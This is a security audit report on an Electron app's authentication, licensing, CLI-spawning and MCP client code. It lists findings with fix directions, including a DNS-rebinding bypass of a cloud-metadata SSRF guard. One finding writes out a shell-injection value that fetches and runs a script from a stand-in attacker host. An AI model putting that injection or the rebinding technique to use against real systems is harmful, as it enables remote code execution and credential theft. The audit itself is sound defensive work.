# Lane L05 — main-security-integrations

Repo: `/Users/tony/AI-Brain-build/metis-2.0` (read-only checkout, origin/main `2bf21f1c`, v1.9.6)
Reviewer: staff-engineer audit pass, AUDIT mode (brownfield discovery + domain-boundary method skimmed; five-axis review: correctness, readability, architecture, security, performance/reliability/testability).
Scope: `src/main/auth.ts`, `license.ts`/`license-*.ts`/`license/`, `secrets.ts`, `security-limits.ts`, `win-security.ts`, `dust-*.ts`, `dustcli.ts`, `cli.ts`, `cli-installer.ts`, `operator-*.ts`, `mcp/`, `net/`, `cloudflare-connect.ts`, `embedded-cloudflare-*.ts`, `cahe-*.ts`, `outlook-write.ts`, `desktop-adapters.ts`, `dev-env.ts`, `app-user-agent.ts`.

## 0. Overall read

This lane is **not a green-field codebase** — it is one of the most heavily self-audited areas of the app. Nearly every file carries `MQA-NNN` markers documenting a prior audit finding and its fix, threat-model comments that anticipate the exact attack this report would otherwise raise (CVE-2024-27980's `.cmd`/EINVAL issue, Windows CreateProcess's cwd-before-PATH search order, TOCTOU on the admin-managed-config ACL check, DNS-rebinding-adjacent IMDS blocking, zip-slip in the tar reader, GCM tag-length pinning, atomic tmp+rename everywhere a secret is persisted). The security invariants declared in file headers (`cli.ts`'s "No shell:true", `secrets.ts`'s KEK wrapping, `win-security.ts`'s ACL trust boundary) are consistently upheld in the code that declares them.

Given that baseline, the findings below are the **real gaps that survived** that level of scrutiny, plus two concrete, reproducible defects. I did not pad this with generic advice; every item below cites the exact file/line and a concrete failure path. Where a "finding" is actually a disclosed, intentional trade-off already documented in the code (license enforcement off, the embedded Cloudflare key's obfuscation-not-secrecy posture), I say so explicitly rather than re-discovering it as new.

---

## Findings (most severe first)

### F1 — P1 / security + reliability + architecture: Operator skill-pack signature is verified against a checked-in **dev placeholder key** in every build this repo can currently produce

**Files:** `src/main/operator-skill-key.ts:16,18-35`, `src/main/operator-overlay.ts:55-119`, `src/shared/operator.ts:19,55-70`
**Evidence label:** OBSERVED (missing wiring, confirmed by direct search) + DERIVED (production consequence)

`getOperatorSkillPublicKeyRaw()` (operator-skill-key.ts:33-35) returns the build-provisioned key at `process.resourcesPath/operator/pubkey.json` when present, **else falls back to `DEV_OPERATOR_PUBLIC_KEY`** (line 16), a placeholder Ed25519 public key committed to source. The header (lines 6-9) says: *"Production builds should replace `resources/operator/pubkey.json` with the live public half."* This is a manual instruction, not an enforced gate.

I checked whether anything actually performs that replacement:
- `resources/operator/` **does not exist** in the repo (`ls resources` — no `operator` entry).
- `electron-builder.yml`'s `extraResources` (top-level, mac-only, and win-only blocks) never references `operator` or `pubkey.json` — every other embedded secret in this codebase (`cloudflare-embed`, `cahe/kimi.json`, `license-lease`) has a corresponding `extraResources` entry; this one has none.
- `scripts/before-pack.mjs` / `scripts/after-pack.mjs` (the two packaging hooks that exist) contain no reference to `pubkey` or `operator`.
- Unlike the sibling embedded-secret features, there is **no build-time check script** for this one. `scripts/check-embedded-cloudflare-key.mjs` and (per `cahe-embedded-key.ts`'s own comment) `scripts/check-cahe-package.mjs` both gate their embed behind an explicit `METIS_EMBED_*=1` opt-in and fail the build if the packaged bytes don't match what was intended. No `check-operator-pubkey.mjs` (or equivalent) exists.

Consequence: with the build configuration present in this checkout, **`resources/operator/pubkey.json` is never populated, so every packaged Métis build verifies Operator skill packs against `DEV_OPERATOR_PUBLIC_KEY`.**

This matters because the overlay poll is **not gated behind an opt-in the way license enforcement is**. `resolveOperatorBaseUrl()` (`src/shared/operator.ts:63-70`) falls back to a hardcoded `DEFAULT_OPERATOR_URL = 'https://metis-operator.tony-walteur.workers.dev'` (line 19) when Settings/env supply nothing — i.e. `operatorUrlConfigured()` is true out of the box for every install. `startOperatorOverlayPoll()` is called unconditionally at boot (`src/main/index.ts:9314`) and on several settings-change paths (index.ts:5075, 5144, 5171). The only remaining gate is a truthy `operatorLicenseToken`/`operatorIngestSecret` (operator-overlay.ts:57-61) — so the poll activates for any install with an Operator seat/license configured (this includes Tony's own daily-driver install per the runtime evidence).

Two ways this plays out, both bad, and I can't tell which without access to the Worker's actual signing key (out of lane / out of repo):
- **If the real Operator Worker signs with a real (Wrangler-secret) private key**, as `operator-skill-key.ts`'s own comment says it should (`"The matching private key is a Wrangler secret (OPERATOR_SKILL_PRIVATE_KEY) and is never in this repo"`), then it does not match `DEV_OPERATOR_PUBLIC_KEY`, so `verifyOperatorSkillPack()` (`operator-skill-verify.ts:33-53`) will **always return null** for genuine packs. `applySignedSkillPack()` (operator-overlay.ts:122-133) then silently no-ops forever — the whole skill-overlay feature is dead in production with no error surfaced anywhere (`mainLog.warn` only fires on a thrown exception from `applyOverlaySkillFile`, not on a failed verify). That's a silent reliability/functionality regression on every shipped build.
- **If a compromised or malicious actor ever gets write access to what `/v1/skills/manifest` returns** (compromised Worker, poisoned KV/D1 row, or any future regression that makes this endpoint reachable via a different host), the Ed25519 check that's supposed to be the **independent, transport-agnostic integrity backstop** for that content provides no real protection today, because it is checking against a key whose private half is a throwaway value with no operational secrecy guarantees, rather than the operator's real production key. `pack.body` reaches `applyOverlaySkillFile(pack.skillId, pack.body)` (mode-skills.ts, out of lane, but the sink is a system-prompt/mode-skill override file for `HUMANIZER_SKILL_ID` / builtin conversation modes) — i.e. attacker-controlled content shaping what every affected user's AI conversation behaves like, gated only by this signature.

**Fix direction:** treat this exactly like the Cloudflare/CAHE embeds: add `resources/operator/pubkey.json` provisioning to `electron-builder.yml`'s `extraResources`, write a `scripts/check-operator-pubkey.mjs` that fails the build if the packaged key still equals `DEV_OPERATOR_PUBLIC_KEY` (a simple string-equality gate is enough — no crypto needed), and add it to the same release-checklist path `check-embedded-cloudflare-key.mjs` already runs on. Until that lands, either disable `startOperatorOverlayPoll()` in packaged builds or treat a missing provisioned key as "manifest polling off" rather than "fall back to dev key."

---

### F2 — P1 / security: DNS-rebinding TOCTOU can bypass the MCP client's cloud-metadata (SSRF) guard

**File:** `src/main/mcp/mcpClient.ts:89-127` (guard) vs. `172-216` (actual connect)
**Evidence label:** OBSERVED (two independent resolution points) + DERIVED (bypass mechanics)

`validateEndpointUrl()` is a genuinely careful SSRF guard: it blocks literal IMDS addresses, the whole `169.254.0.0/16` link-local range, IPv4-mapped IPv6 forms, and — when the host isn't already a literal IP — does its own `dns.lookup(bareHost, { all: true })` (line 115) to catch a hostname that merely *resolves to* a blocked address.

But this resolution is **only used for the check**. The actual connection a few lines later, in `withClient()` (line 185), builds `new StreamableHTTPClientTransport(new URL(endpointUrl), …)` from the **same hostname string**, which triggers its own, independent DNS resolution deep inside the MCP SDK's HTTP transport at connect time. Nothing pins the IP address that passed validation and forces the real connection to use exactly that address.

This is the standard DNS-rebinding bypass shape: an attacker who controls the DNS answer for the configured MCP endpoint's hostname (their own domain, TTL=0) can return a public/safe IP for the validation lookup and then a blocked address (e.g. `169.254.169.254`) for the connection lookup a few hundred milliseconds later. The module's own comment even anticipates DNS failures at line 122-125 ("a DNS lookup failure here isn't this guard's concern — the real connect attempt below will surface it") without noticing the two lookups can *both succeed* and disagree.

Exploitability requires the user (or something that convinces the user) to point a BidStack/Plane MCP connection at an attacker-controlled hostname — plausible for a "connect your CRM" flow where the endpoint URL is operator- or user-supplied, and exactly the threat class this guard exists to close (its own comment: *"a tampered or mistyped Settings value pointed here, combined with the stored bearer token, would let 'push' act as an SSRF primitive against the host's own cloud credentials"*). In an enterprise/VDI/cloud-desktop deployment (relevant to the "enterprise readiness" goal for v2.0) where IMDS is actually reachable from the endpoint, this reopens exactly that primitive.

**Fix direction:** resolve the hostname once, validate the resolved address(es), and force the transport to connect to a pinned IP (or reuse the resolved address for the request's `Host` header / connect-to option) rather than letting a second, independent lookup happen at connect time. Standard mitigation used by SSRF-hardened HTTP clients (e.g. pin via a custom `dns.lookup` override passed to the fetch/agent, or an explicit `Agent` with a fixed `lookup`).

---

### F3 — P1 / security + architecture-consistency: bare `'powershell.exe'` in license device-identity resolution (Windows CWD-hijack)

**File:** `src/main/license/device.ts:75,82,92`
**Evidence label:** OBSERVED

`win-security.ts`'s own header (lines 25-34) states the invariant for the **entire main process**: *"Invoke Windows system tools by ABSOLUTE `%SystemRoot%\System32` path, never bare name… so a planted binary in an attacker-writable cwd" can't hijack the lookup*, and exports `WINDOWS_POWERSHELL` (an absolute `System32\WindowsPowerShell\v1.0\powershell.exe` path) specifically so "this invariant holds repo-wide." I confirmed two legitimate consumers (`dust-secret-store.ts`, `foreground-watcher.ts`) use that pinned constant.

`license/device.ts`'s `winSerial()` (line 75, 82) and `winModel()` (line 92) call `execFileSync('powershell.exe', [...])` with the **bare executable name**, not `WINDOWS_POWERSHELL`. This is the exact CreateProcess search-order gap `win-security.ts` documents (own-install-dir, then **current working directory**, before PATH): if Métis is ever launched with an attacker-writable cwd (a shortcut with a "Start in" folder the attacker controls, a file association launch from a shared/Downloads folder, etc.), a planted `powershell.exe` in that cwd executes instead of the system one — and its output becomes this device's hardware-serial identity, which flows straight into `hashDeviceId()` and the member-license `sub` binding (`license/activate.ts`, `license/jws.ts`). An attacker who controls the "serial" this device reports can potentially clone/replay a license binding, or simply run arbitrary code with the app's own privileges the moment `identitySnapshot()`/`activate()` calls this path (which happens on the license-status screen and on every activation attempt).

**Fix direction:** replace the three bare `'powershell.exe'` call sites in `device.ts` with the exported `WINDOWS_POWERSHELL` constant from `win-security.ts`, matching the pattern already used elsewhere. Mechanical, low-risk fix.

---

### F4 — P2 / security-correctness: a signed-in session's tenant ID is never re-validated after the fact

**File:** `src/main/auth.ts:483-487` (`expiryReason`), `500-524` (`probeRefreshToken`), `531-544` (`revalidateSession`)
**Evidence label:** OBSERVED + DERIVED

`Session` (auth.ts:39-45) stores `tid` (the Entra tenant GUID) at sign-in time, and it is checked once, at sign-in (`tenantMatches(tid, cfg.tenantId)`, line 855). After that, the periodic re-validation sweep (`revalidateSession`, every 30 min, plus every `authStatus()` call) only checks:
- `expiryReason()` — max age (7 days) and **domain** (`s.domain !== cfg.allowedDomain`) — never `s.tid` vs. `cfg.tenantId`.
- `probeRefreshToken()` — calls `acquireTokenSilent` against `makePca(cfg)` built from the **current** (possibly rotated) `cfg.tenantId`. If IT rotates the tenant ID (e.g. in response to a compromised tenant, a recommended incident-response step) while the allowed domain stays the same, this call will fail against the wrong authority — but that failure is almost certainly *not* `InteractionRequiredAuthError`/`invalid_grant`/`interaction_required` (it's an authority/tenant mismatch, a different error class), so `probeRefreshToken()` classifies it `'unknown'` (line 522), and `'unknown'` is explicitly treated as "keep the session" (line 540: only `'revoked'` clears it).

Net effect: a device that signed in before a tenant-ID rotation stays signed in and privileged (per `requireAuth()`) for up to `MAX_SESSION_AGE_MS` (7 days) after an admin rotates the tenant — the one scenario ("IT can hard-lock the org tenant") the module's own comments call out as the point of tenant-locking sign-in. This is a narrow window (requires a config change specifically to tenant ID, not domain) but it is a real gap in a module that is otherwise extremely careful about exactly this class of drift.

**Fix direction:** add a `s.tid !== cfg.tenantId` check to `expiryReason()` alongside the existing domain check, so a tenant rotation forces the same fresh-sign-in path a domain change already does.

---

### F5 — P2 / architecture consistency (defense-in-depth gap, not currently exploitable): `resolveBin()` builds a shell command string from an unvalidated `bin` parameter

**File:** `src/main/cli.ts:216-256`, specifically line 243
**Evidence label:** OBSERVED (code) + OBSERVED (all current call sites are hardcoded literals, confirmed by grep)

`cli.ts`'s own header (lines 4-10) declares as a security invariant: *"No shell:true. All spawns pass args as an array."* `resolveBin()` mostly honors this, but on macOS/Linux it does:

```ts
const { stdout } = await execFileAsync(shell, ['-lc', `command -v ${bin}`])
```

`bin` is interpolated directly into a string that a login shell (`-lc`) parses. Today every call site passes a hardcoded literal (`'dust'`, `'npm'`, `'claude'`, `'codex'`, or `cfg.bin` from the static `CLI_CONFIGS` map keyed by `ProviderId`) — I confirmed this via `grep -rn "resolveBin("` across `src/main`; there is no reachable path today where `bin` carries renderer/user/config-supplied text. So this is **not currently exploitable**.

It is, however, a landmine relative to the file's own stated invariant: `resolveBin(bin: string)` has no allowlist or character validation on `bin`, so the very next feature that resolves a binary name sourced from Settings, a plugin marketplace ID, or an MCP-declared tool name reopens classic shell injection (`bin = "x; curl attacker.sh | sh"`).

**Fix direction:** either restrict `resolveBin`'s parameter to a small literal union (mirroring `ManagedCliSpec['id']`) so TypeScript itself blocks a future free-text caller, or replace the `-lc "command -v ${bin}"` construction with an array-safe equivalent (e.g. `execFileAsync(shell, ['-lc', 'command -v "$1"', '--', bin])`, which passes `bin` as `$1` rather than splicing it into the parsed command text).

---

### F6 — P2 / architecture consistency: `invokeResolvedBinLines`'s safety check is narrower than the file's own established pattern

**File:** `src/main/cli.ts:1507-1521` vs. `335-376` (`cmdShimSpawn`, same file)
**Evidence label:** OBSERVED

`cmdShimSpawn()` (used for the actual spawned CLI process) rejects any arg or bin path containing `["\r\n&|^%<>()!]` — the full cmd.exe metacharacter set — with a documented rationale for each character. `loginScriptPathSafe()` (line 1507-1509), used by `invokeResolvedBinLines()` to build the **text lines of a login script** that `openCliScript()` later hands to a real shell/`cmd.exe` (via `shell.openPath` / Windows `start`), only rejects `["\r\n%]` — a strict subset. The comment at the call site (line 326-327) argues this is safe because `bin` is `resolveBin()`'s own resolved path, "not user-typed text" — true, but that's exactly the same argument `cmdShimSpawn` makes for its own (stricter) check, and an install path containing `&`/`|`/`(` (a onedrive-synced folder with unusual naming, a corporate-imaged machine with unusual `Program Files (x86)` variants, an npm global-bin path a user configured) would sail through `loginScriptPathSafe` and land verbatim in a script line a shell later executes.

**Fix direction:** reuse `cmdShimSpawn`'s character set (or extract it as a shared constant) in `loginScriptPathSafe`, so both "safe bin path" checks in this file apply the same bar.

---

### F7 — P2 / architecture + reliability: the license-lease public key has the identical missing-provisioning gap as F1, currently inert only because licensing is compiled off

**File:** `src/main/license-lease-key.ts:42-83`
**Evidence label:** OBSERVED

Same shape as F1: `getLicenseLeasePublicKeyRaw()` falls back to a committed `DEV_LEASE_PUBLIC_KEY` (line 47) when `resources/license-lease/pubkey.json` isn't provisioned, and I confirmed (as with F1) there is no `extraResources` entry or check script wiring that path in the current build config. This module is unusually self-aware about it — the header (lines 29-34) explicitly says *"THIS MUST NEVER BE TREATED AS PRODUCTION-TRUSTWORTHY… Before actually turning `LICENSE_ENFORCEMENT` on for real users, provision source (1)… and confirm `embeddedLicenseLeasePubkeyAvailable()` reports true"* — but `embeddedLicenseLeasePubkeyAvailable()` (line 81-83) is exported and, as far as I can find, **never called** by any script, test-as-gate, or CI step in this checkout. It's a hook waiting for a release-readiness check that doesn't exist yet.

Currently harmless in practice: `license.ts`'s header (MQA-068, lines 5-14) confirms `LICENSE_ENFORCEMENT` is compiled off in the renderer, so `verifyLease()`/`checkLicenseGrace()` never gate anything today. This is flagged now because **v2.0's stated goal includes shipping real license enforcement**, and this is the second of two places in the lane where "provision the real key before enabling the feature" is a manual, unenforced step rather than a build gate.

**Fix direction:** build one small release-readiness script that asserts both `embeddedLicenseLeasePubkeyAvailable()` (this file) and the equivalent operator-pubkey check (F1) are true whenever the build is about to flip `LICENSE_ENFORCEMENT`/enable Operator polling for a real customer channel, and fail the build otherwise.

---

### F8 — P2 (flagged per audit brief, not a newly-discovered defect): license enforcement is compiled off; embedded default Cloudflare credential is disclosed obfuscation, not secrecy

**Files:** `src/renderer/src/App.tsx` (`LICENSE_ENFORCEMENT = false`, outside this lane's file set but the reason the whole `license.ts` subsystem is inert), `src/main/license.ts:5-14`, `src/main/embedded-cloudflare-key.ts:25-34`, `src/main/embedded-cloudflare-crypto.ts:11-14`, `scripts/embed-cloudflare-key.mjs:20-22,88-91`
**Evidence label:** OBSERVED (both are extensively self-documented in the source itself)

Two items the audit brief calls out by name, both already fully disclosed in-repo rather than hidden:

1. **License enforcement.** `license.ts`'s own header (MQA-068) states the entire phone-home/lease/trial pipeline is wired and tested but neutered by two renderer constants (`LICENSE_ENFORCEMENT`, `LICENSE_UI_ENABLED`), and warns explicitly against re-claiming the subsystem is "live" without flipping both and re-verifying end to end. This is a **product decision**, not a bug I'm discovering — I confirmed the mechanism (`checkLicenseGrace()`, `heartbeat()`, `verifyLease()`) is sound (see F7 for the one real gap in it). For v2.0, this is a go/no-go decision the plan needs to make explicitly rather than carry silently: either turn it on (after fixing F7) or delete the dead-code path and its complexity.
2. **Embedded Cloudflare credential.** `embedded-cloudflare-key.ts` and its build-time counterpart both carry prominent "SECURITY HONESTY" sections stating plainly that the AES-256-GCM wrapping is **obfuscation** (the KDF passphrase ships in the binary), not secrecy, and that what actually makes it safe to ship is the *scope* of the embedded token (a revocable, rate-limited account/Worker credential), never the encryption. The packaging gate (`check-embedded-cloudflare-key.mjs`) is genuinely good: it requires an explicit `METIS_EMBED_CLOUDFLARE_KEY=1` opt-in, verifies the blob round-trips, and scans the packaged `app.asar` to prove the plaintext token isn't sitting anywhere in the clear. I have no code-level finding here beyond what the team already documents; the only actionable item is **operational**: confirm the embedded token in any release build is genuinely a scoped/rate-limited/rotatable credential (I did not inspect the actual embedded value — that's account material, not something this review should print or verify at runtime).

---

## Positive notes (things this lane already gets right, worth preserving in any refactor)

- `secrets.ts`'s KEK-wrapping of the file-backend key, with fail-closed `KeychainKeyRecoveryError` rather than silent key regeneration, is exactly the right trade-off for an unsigned/dev-keystore build that must coexist with a signed one.
- `win-security.ts`'s `readTrustedAdminManaged()` closes a real TOCTOU (ACL-check-by-path vs. read-by-path) via a held fd + dev/ino re-assertion — this is unusually rigorous and should be the template for any new "trust this file only if X" check added elsewhere.
- `net/egress-guard.ts` and `mcp/mcpClient.ts`'s IMDS/link-local blocking (modulo F2) both show real SSRF awareness (redirect refusal, credential-header stripping across origin changes on redirect, IPv4-mapped-IPv6 handling) that a lot of enterprise Electron apps skip entirely.
- `cli-installer.ts`'s tarball pipeline (registry `dist.integrity` sha512 verification before any disk write, zip-slip rejection, atomic tmp-dir promotion) is a solid, complete supply-chain control for the one-click CLI installer.
- `cli.ts`'s CVE-2024-27980 handling and the `cmdShimSpawn` metacharacter/quoting discipline (see F6 for the one place it isn't reused) reflect a real, specific Windows threat model, not boilerplate.

## Test coverage gaps observed

- No test exercises the DNS-rebinding scenario in F2 (i.e., a case where `validateEndpointUrl`'s DNS lookup and the transport's own connect-time resolution could disagree) — reasonable, since it requires a rebinding-capable fixture, but worth a unit test around a pinned-lookup fix.
- No test asserts `resources/operator/pubkey.json` (or `resources/license-lease/pubkey.json`) is present/non-placeholder for a "release" build profile — this is exactly the gap that let F1/F7 exist unnoticed.
- `device.ts`'s Windows helpers (`winSerial`/`winModel`) have no test asserting the spawned command is the pinned `WINDOWS_POWERSHELL` path (unlike `dust-secret-store.ts`'s `winCredReadSpawnSpec`, which is specifically exported "so a unit test can assert the command" — the missing equivalent test here is likely how F3 slipped through).

## Architecture notes

The lane is organized as many small, single-responsibility modules (one file per credential type / provider), each with its own encrypted-at-rest storage convention reusing `secrets.ts`'s primitives (`mcpSecrets.ts`, `dust-secret-store.ts`, `license/secret-store.ts`, `store.ts`'s own key marker). This is a good pattern and should be the template going forward rather than something to consolidate away — the repeated "marker file + tmp/rename + AES-GCM-or-safeStorage" shape is a feature (each secret family fails independently and atomically), not duplication to DRY up. The one place I'd genuinely refactor is the **embedded-key provisioning story** (F1 + F7): right now there are three near-identical "decrypt/verify a build-provisioned credential, else use a fallback" modules (`embedded-cloudflare-key.ts`, `cahe-embedded-key.ts`, `operator-skill-key.ts`/`license-lease-key.ts`) with three different levels of build-time enforcement (Cloudflare and Cahê both have an explicit packaging-time check script; Operator and license-lease have none). Extracting one shared "provisioned-secret" packaging-check helper (parameterized by resource path + a "must not equal this placeholder" assertion) would make F1/F7 structurally impossible to reintroduce.
